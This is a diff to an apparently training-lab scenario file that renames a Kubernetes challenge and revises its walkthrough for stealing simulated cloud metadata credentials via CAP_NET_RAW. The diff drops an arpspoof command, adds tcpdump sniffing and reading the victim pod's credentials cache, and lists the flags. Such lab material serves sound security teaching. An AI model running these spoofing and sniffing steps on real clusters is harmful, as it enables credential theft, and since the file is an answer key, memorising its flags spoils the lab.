@@ -1,10 +1,10 @@
-# K8S-31 CAP_NET_RAW → 元数据服务 MITM
+# CLOUD-02 CAP_NET_RAW → 元数据服务 MITM
 
 ## 场景信息
 
 | 字段 | 值 |
 |---|---|
-| ID | K8S-31 |
+| ID | CLOUD-02 |
 | 名称 | Container Escape via CAP_NET_RAW → Metadata MITM |
 | 技术/CVE | N/A (CAP_NET_RAW + ARP spoofing) |
 | 难度 | L3 |
@@ -33,7 +33,7 @@
    窃取 `AKIA...` 凭据与 flag。
 
 ## Flag
-`flag{k8s-31-step1-netraw}` 及窃取到的凭据
+`flag{cloud-02-step1-netraw}` 及窃取到的凭据
 
 ## 此场景利用了哪些知识
 
@@ -57,7 +57,7 @@
 | CVE/Technique | N/A (CAP_NET_RAW + ARP spoofing) |
 | Difficulty | L3 |
 | Type | k8s |
-| Path | scenarios/k8s/cap-netraw-metadata |
+| Path | scenarios/cloud/cap-netraw-metadata |
 
 ## Attack Path Summary
 CAP_NET_RAW capability → ARP spoofing → intercept victim→metadata traffic → steal IMDS credentials
@@ -74,7 +74,7 @@ CAP_NET_RAW capability → ARP spoofing → intercept victim→metadata traffic 
 
 ## Step-by-Step Exploitation
 ### Step 1: Deploy Attacker Pod with CAP_NET_RAW
-**Flag:** `flag{k8s-31-step1-netraw}`
+**Flag:** `flag{cloud-02-step1-netraw}`
 
 ```bash
 kubectl get pods
@@ -82,21 +82,24 @@ kubectl exec -it attacker -- sh
 ```
 
 ### Step 2: ARP Spoof + Metadata Interception
-Use CAP_NET_RAW to redirect victim pod traffic through attacker, capturing IMDS credentials.
+The victim continuously requests the metadata Service credentials endpoint. The metadata
+NetworkPolicy allows only the victim label, so an attacker must observe or redirect the
+same-node traffic instead of querying the Service directly.
 
 ```bash
-arpspoof -i eth0 -t <victim_ip> <gateway_ip>
-tcpdump -i eth0 -A port 5000
+kubectl exec attacker -- ip addr
+kubectl exec attacker -- tcpdump -i eth0 -A port 5000
 ```
 
 ### Step 3: Use Stolen Credentials
 Use captured IMDS credentials to access protected cloud resources.
 
 ## Flag Location
-- Flag: Environment variable in victim pod
+- Flag: simulated IMDS credentials response from the `metadata` Service
+- Victim cache: `/tmp/metadata-credentials.json`
 
 ## Verification Commands
 ```bash
 kubectl exec attacker -- cat /proc/1/status | grep Cap
-kubectl exec victim -- env | grep FLAG
+kubectl exec victim -- cat /tmp/metadata-credentials.json
 ```
